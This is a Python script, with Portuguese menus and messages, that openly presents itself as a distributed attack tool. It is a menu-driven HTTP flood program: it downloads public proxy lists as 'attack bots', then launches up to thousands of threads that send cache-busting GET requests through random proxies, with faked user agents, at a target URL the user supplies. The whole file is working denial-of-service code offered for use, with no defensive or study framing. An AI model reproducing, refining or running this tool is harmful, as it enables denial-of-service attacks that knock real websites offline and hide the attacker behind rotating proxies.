import os
import sys
import time
import threading
import requests
import random
import signal
from fake_useragent import UserAgent

class Cores:
    RESET = '\033[0m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    CYAN = '\033[0;36m'
    MAGENTA = '\033[0;35m'
    BOLD = '\033[1m'

def banner():
    os.system('clear')
    print(f"""{Cores.RED}{Cores.BOLD}
 __   __  __   __  ______    _______  _______  ______    _______  __   __
|  | |  ||  | |  ||    _ |  |       ||       ||    _ |  |       ||  | |  |
|  |_|  ||  |_|  ||   | ||  |    ___||   _   ||   | ||  |_     _||  |_|  |
|       ||       ||   |_||_ |   |___ |  | |  ||   |_||_   |   |  |       |
|       ||       ||    __  ||    ___||  |_|  ||    __  |  |   |  |       |
|_     _||   _   ||   |  | ||   |___ |       ||   |  | |  |   |  |   _   |
  |___|  |__| |__||___|  |_||_______||_______||___|  |_|  |___|  |__| |__|
        {Cores.YELLOW}A Ferramenta de Ataque Distribuído Multi-Vetor{Cores.RESET}
    """)

attack_running = False
requests_sent = 0
requests_failed = 0
proxy_list = []

def update_bots():
    global proxy_list
    banner()
    print(f"{Cores.YELLOW}[*] Procurando e atualizando a lista de bots de ataque (proxies)...{Cores.RESET}")
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
    ]
    temp_proxies = set()
    for url in proxy_sources:
        try:
            print(f"{Cores.CYAN}[~] Baixando da fonte: {url.split('/')[2]}...{Cores.RESET}")
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                temp_proxies.update(response.text.strip().split('\n'))
        except requests.RequestException:
            print(f"{Cores.RED}[-] Falha ao baixar da fonte.{Cores.RESET}")
    proxy_list = list(filter(None, temp_proxies))
    if not proxy_list:
        print(f"\n{Cores.RED}[!] Não foi possível encontrar bots. Verifique sua conexão.{Cores.RESET}")
        return False
    print(f"\n{Cores.GREEN}[+] {len(proxy_list)} bots de ataque encontrados e prontos!{Cores.RESET}")
    time.sleep(3)
    return True

def attack_thread(target_url, end_time, ua):
    global attack_running, requests_sent, requests_failed
    while time.time() < end_time and attack_running:
        try:
            proxy = random.choice(proxy_list)
            proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
            headers = {'User-Agent': ua.random}
            attack_url = f"{target_url}?cache_bust={random.randint(100000, 999999)}"
            requests.get(attack_url, headers=headers, proxies=proxy_dict, timeout=5)
            requests_sent += 1
        except Exception:
            requests_failed += 1

def display_status(duration, target_url, thread_count):
    start_time = time.time()
    while attack_running and (time.time() - start_time) < duration:
        elapsed_time = time.time() - start_time
        status_line = f"{Cores.YELLOW}Atacando {Cores.BOLD}{target_url}{Cores.RESET}{Cores.YELLOW} | Tempo: {Cores.CYAN}{int(elapsed_time)}s/{duration}s{Cores.RESET} | Sucesso: {Cores.GREEN}{requests_sent}{Cores.RESET} | Falhas: {Cores.RED}{requests_failed}{Cores.RESET}"
        print(f"\r{status_line.ljust(80)}", end="", flush=True)
        time.sleep(1)

def start_attack():
    global attack_running, requests_sent, requests_failed, proxy_list
    if not proxy_list and not update_bots(): return
    banner()
    try:
        target_url = input(f"{Cores.YELLOW}[?] Insira a URL do alvo: {Cores.CYAN}")
        if not target_url.startswith(('http://', 'https://')):
            print(f"{Cores.RED}[!] URL inválida.{Cores.RESET}"); time.sleep(2); return
        thread_count = int(input(f"{Cores.YELLOW}[?] Threads (ex: 1000): {Cores.CYAN}"))
        duration = int(input(f"{Cores.YELLOW}[?] Duração em segundos: {Cores.CYAN}"))
    except ValueError:
        print(f"{Cores.RED}[!] Entrada inválida.{Cores.RESET}"); time.sleep(2); return
    print(f"\n{Cores.MAGENTA}Preparando o enxame...{Cores.RESET}\n"); time.sleep(2)
    attack_running = True; requests_sent = 0; requests_failed = 0
    ua = UserAgent(); end_time = time.time() + duration
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=attack_thread, args=(target_url, end_time, ua)); thread.daemon = True; threads.append(thread); thread.start()
    status_thread = threading.Thread(target=display_status, args=(duration, target_url, thread_count)); status_thread.daemon = True; status_thread.start()
    try:
        while time.time() < end_time: time.sleep(1)
        attack_running = False
    except KeyboardInterrupt:
        print(f"\n\n{Cores.RED}[!] Ataque interrompido!{Cores.RESET}"); attack_running = False
    print(f"\n{Cores.YELLOW}Aguardando as threads finalizarem...{Cores.RESET}")
    for thread in threads: thread.join(timeout=2.0)
    print(f"\n{Cores.GREEN}ATAQUE FINALIZADO!{Cores.RESET}"); input("\nPressione Enter para voltar ao menu...")

def main_menu():
    while True:
        banner()
        print(f"{Cores.CYAN}   [1] Iniciar Ataque{Cores.RESET}")
        print(f"{Cores.CYAN}   [2] Atualizar Lista de Bots{Cores.RESET}")
        print(f"{Cores.CYAN}   [3] Sair{Cores.RESET}\n")
        choice = input(f"{Cores.YELLOW}   Escolha uma opção > {Cores.RESET}")
        if choice == '1': start_attack()
        elif choice == '2': update_bots()
        elif choice == '3': print(f"\n{Cores.YELLOW}Até a próxima!{Cores.RESET}"); sys.exit(0)
        else: print(f"\n{Cores.RED}[!] Opção inválida.{Cores.RESET}"); time.sleep(1)

if __name__ == "__main__": main_menu()
